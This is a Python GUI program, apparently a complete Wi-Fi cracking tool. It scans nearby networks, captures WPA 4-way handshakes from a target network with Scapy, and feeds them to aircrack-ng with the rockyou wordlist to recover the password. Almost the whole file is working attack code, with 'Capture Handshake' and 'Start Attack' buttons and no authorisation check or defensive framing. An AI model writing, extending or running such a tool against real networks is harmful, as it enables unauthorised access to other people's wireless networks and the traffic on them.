#!/usr/bin/env python3
"""
Wi-Fi Tool – GUI (clean light theme)
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, simpledialog
import threading
import queue
import platform
import sys
import os
import time
import subprocess
import ctypes

# Scapy setup
try:
    from scapy.config import conf
    conf.cache = False
except:
    pass

try:
    from scapy.all import sniff, Dot11, Dot11Beacon, RadioTap, EAPOL, wrpcap
except ImportError:
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Error", "Scapy is not installed.\n\nRun:\npip install scapy")
    sys.exit(1)

# ================= CONFIG =================
SCAN_DURATION     = 20
CAPTURE_DURATION  = 90
OUTPUT_PCAP       = "handshake.pcap"
INTERFACE         = "wlan0"
MAX_WORKERS       = 8
ROCKYOU_PATH      = "rockyou.txt"
MAX_ROCKYOU_LINES = 100_000

stop_event   = threading.Event()
result_queue = queue.Queue()

# ─── Worker Functions ─────────────────────────────────────────────────

def log_status(msg):
    result_queue.put(("status", msg))

def scan_wifi_windows():
    log_status("Windows Wi-Fi scan starting (netsh)...")
    try:
        out = subprocess.check_output(
            ["netsh", "wlan", "show", "networks", "mode=bssid"],
            text=True, stderr=subprocess.STDOUT
        )
        log_status("Scan results:\n" + out.strip())
    except Exception as e:
        log_status(f"Windows scan failed: {str(e)}")

def scan_thread(iface):
    log_status(f"Starting Linux scan on {iface}...")
    networks = {}
    try:
        def handler(pkt):
            if stop_event.is_set():
                return True
            if pkt.haslayer(Dot11Beacon):
                bssid = pkt[Dot11].addr3.upper()
                if bssid in networks:
                    return
                ssid = pkt[Dot11Beacon].info.decode('utf-8', errors='ignore') or "<hidden>"
                signal = getattr(pkt[RadioTap], "dBm_AntSignal", "N/A") if pkt.haslayer(RadioTap) else "N/A"
                networks[bssid] = {"ssid": ssid, "signal": signal}
                result_queue.put(("found", f"{ssid:<25} | {bssid} | {signal} dBm"))

        sniff(iface=iface, prn=handler,
              stop_filter=lambda p: stop_event.is_set(),
              timeout=SCAN_DURATION, store=0)
        log_status("Scan finished")
    except Exception as e:
        log_status(f"Scan error: {str(e)}")

def capture_thread(iface, bssid, ssid):
    log_status(f"Starting handshake capture → {ssid} ({bssid})")
    packets = []
    count = [0]
    try:
        def handler(pkt):
            if stop_event.is_set():
                return True
            if pkt.haslayer(EAPOL):
                count[0] += 1
                packets.append(pkt)
                log_status(f"EAPOL packet {count[0]} captured")
                if count[0] >= 4:
                    log_status("Full 4-way handshake captured!")
                    return True
            return False

        sniff(iface=iface, prn=handler,
              stop_filter=lambda p: stop_event.is_set() or count[0] >= 4,
              timeout=CAPTURE_DURATION, store=0)

        if packets:
            wrpcap(OUTPUT_PCAP, packets)
            log_status(f"Handshake saved → {OUTPUT_PCAP}")
        else:
            log_status("No handshake captured in time")
    except Exception as e:
        log_status(f"Capture failed: {str(e)}")

def dictionary_attack_thread(ssid, pcap_path):
    log_status(f"Starting dictionary attack on '{ssid}'...")

    # Check for handshake file
    if not os.path.exists(pcap_path):
        log_status(f"ERROR: No handshake file found at '{pcap_path}'")
        log_status("Capture a handshake first, then run the attack.")
        return

    # Check wordlist exists
    if not os.path.exists(ROCKYOU_PATH):
        log_status("ERROR: rockyou.txt not found.")
        log_status("Place rockyou.txt in the same folder as this script.")
        return

    log_status(f"Running aircrack-ng against {pcap_path}...")

    try:
        proc = subprocess.Popen(
            ["aircrack-ng", pcap_path, "-w", ROCKYOU_PATH, "-e", ssid],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        for line in proc.stdout:
            line = line.strip()
            if not line:
                continue
            log_status(line)
            if "KEY FOUND" in line:
                result_queue.put(("cracked", line))
                proc.terminate()
                return
            if stop_event.is_set():
                proc.terminate()
                log_status("Attack stopped by user.")
                return

        proc.wait()
        log_status("Attack finished – password not found in wordlist.")

    except FileNotFoundError:
        log_status("ERROR: aircrack-ng not found.")
        log_status("Install it:  sudo apt install aircrack-ng  (Linux)")
        log_status("          or download from https://www.aircrack-ng.org (Windows)")

# ─── GUI ──────────────────────────────────────────────────────────────

class WiFiToolGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Wi-Fi Tool")
        self.root.geometry("880x640")
        self.root.minsize(720, 520)
        self.root.configure(bg="#f5f5f5")

        self._build_styles()
        self._build_header()
        self._build_log()
        self._build_buttons()
        self._build_statusbar()

        self.root.after(200, self.update_from_queue)
        self.log("info", "Ready. Press a button to begin.")

    def _build_styles(self):
        s = ttk.Style()
        s.theme_use("clam")

        s.configure("TFrame",        background="#f5f5f5")
        s.configure("Header.TFrame", background="#ffffff")

        s.configure("TButton",
                    font=("Segoe UI", 9),
                    padding=(12, 6),
                    background="#ffffff",
                    foreground="#222222",
                    borderwidth=1,
                    relief="flat")
        s.map("TButton",
              background=[("active", "#e8e8e8")])

        s.configure("Stop.TButton",
                    font=("Segoe UI", 9),
                    padding=(12, 6),
                    background="#fff0f0",
                    foreground="#cc2222",
                    borderwidth=1,
                    relief="flat")
        s.map("Stop.TButton",
              background=[("active", "#ffe0e0")])

        s.configure("Status.TLabel",
                    background="#eeeeee",
                    foreground="#666666",
                    font=("Segoe UI", 9),
                    padding=(8, 3))

    def _build_header(self):
        header = ttk.Frame(self.root, style="Header.TFrame")
        header.pack(fill=tk.X)

        tk.Label(header,
                 text="Wi-Fi Tool",
                 bg="#ffffff", fg="#111111",
                 font=("Segoe UI", 12, "bold"),
                 padx=14, pady=10).pack(side=tk.LEFT)

        tk.Label(header,
                 text=platform.system() + " · " + platform.node(),
                 bg="#ffffff", fg="#999999",
                 font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=4)

        tk.Frame(self.root, bg="#dddddd", height=1).pack(fill=tk.X)

    def _build_log(self):
        frame = ttk.Frame(self.root)
        frame.pack(padx=12, pady=(10, 6), fill=tk.BOTH, expand=True)

        self.log_area = scrolledtext.ScrolledText(
            frame,
            wrap=tk.WORD,
            font=("Consolas", 10),
            bg="#ffffff",
            fg="#222222",
            relief="flat",
            borderwidth=1,
            padx=8, pady=6,
            insertbackground="#222222"
        )
        self.log_area.pack(fill=tk.BOTH, expand=True)

        # Color tags
        self.log_area.tag_config("info",    foreground="#888888")
        self.log_area.tag_config("status",  foreground="#1a6cb5")
        self.log_area.tag_config("found",   foreground="#1a8a3a")
        self.log_area.tag_config("trying",  foreground="#aaaaaa")
        self.log_area.tag_config("cracked", foreground="#1a8a3a")
        self.log_area.tag_config("error",   foreground="#cc2222")
        self.log_area.tag_config("warn",    foreground="#cc7700")

        self.log_area.configure(state=tk.DISABLED)

    def _build_buttons(self):
        tk.Frame(self.root, bg="#dddddd", height=1).pack(fill=tk.X)

        btn_frame = ttk.Frame(self.root)
        btn_frame.pack(fill=tk.X, padx=12, pady=8)

        ttk.Button(btn_frame, text="Scan Wi-Fi",        command=self.start_scan).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Capture Handshake", command=self.start_capture).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Start Attack",      command=self.start_attack).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Stop",              command=self.stop_all, style="Stop.TButton").pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Clear Log",         command=self.clear_log).pack(side=tk.RIGHT, padx=3)

    def _build_statusbar(self):
        tk.Frame(self.root, bg="#dddddd", height=1).pack(fill=tk.X)
        self.status_var = tk.StringVar(value="Ready")
        ttk.Label(self.root, textvariable=self.status_var,
                  style="Status.TLabel").pack(side=tk.BOTTOM, fill=tk.X)

    def log(self, tag, message):
        self.log_area.configure(state=tk.NORMAL)
        ts = time.strftime("%H:%M:%S")
        prefix = {
            "info":    f"{ts}  ",
            "status":  f"{ts}  [+] ",
            "found":   f"{ts}  [✓] ",
            "trying":  "",
            "cracked": f"{ts}  [!] ",
            "error":   f"{ts}  [✗] ",
            "warn":    f"{ts}  [~] ",
        }.get(tag, f"{ts}  ")
        self.log_area.insert(tk.END, prefix + message + "\n", tag)
        self.log_area.see(tk.END)
        self.log_area.configure(state=tk.DISABLED)

    def clear_log(self):
        self.log_area.configure(state=tk.NORMAL)
        self.log_area.delete("1.0", tk.END)
        self.log_area.configure(state=tk.DISABLED)
        self.log("info", "Log cleared.")

    def update_from_queue(self):
        while not result_queue.empty():
            typ, data = result_queue.get()
            if typ == "status":
                self.log("status", data)
                self.status_var.set(data[:100] + "..." if len(data) > 100 else data)
            elif typ == "found":
                self.log("found", data)
            elif typ == "trying":
                self.log("trying", data)
            elif typ == "cracked":
                self.log("cracked", f"PASSWORD FOUND: {data}")
                messagebox.showinfo("Result", f"Password recovered:\n{data}")
        self.root.after(150, self.update_from_queue)

    def start_scan(self):
        stop_event.clear()
        self.log("status", "Starting Wi-Fi scan...")
        if platform.system() == "Windows":
            threading.Thread(target=scan_wifi_windows, daemon=True).start()
        else:
            threading.Thread(target=scan_thread, args=(INTERFACE,), daemon=True).start()

    def start_capture(self):
        if platform.system() != "Linux":
            messagebox.showwarning("Warning", "Capture only works on Linux with monitor mode enabled.")
            return
        bssid = simpledialog.askstring("Capture Handshake", "Target BSSID:")
        if not bssid:
            return
        ssid = simpledialog.askstring("Capture Handshake", "Target SSID:")
        if not ssid:
            return
        stop_event.clear()
        self.log("status", "Starting handshake capture...")
        threading.Thread(target=capture_thread, args=(INTERFACE, bssid, ssid), daemon=True).start()

    def start_attack(self):
        ssid = simpledialog.askstring("Dictionary Attack", "Target SSID:")
        if not ssid:
            return
        stop_event.clear()
        self.log("status", "Starting dictionary attack...")
        threading.Thread(target=dictionary_attack_thread, args=(ssid, OUTPUT_PCAP), daemon=True).start()

    def stop_all(self):
        stop_event.set()
        self.log("warn", "Stop command sent — waiting for threads to finish.")
        self.status_var.set("Stopping...")


if __name__ == "__main__":
    root = tk.Tk()
    app = WiFiToolGUI(root)
    root.mainloop()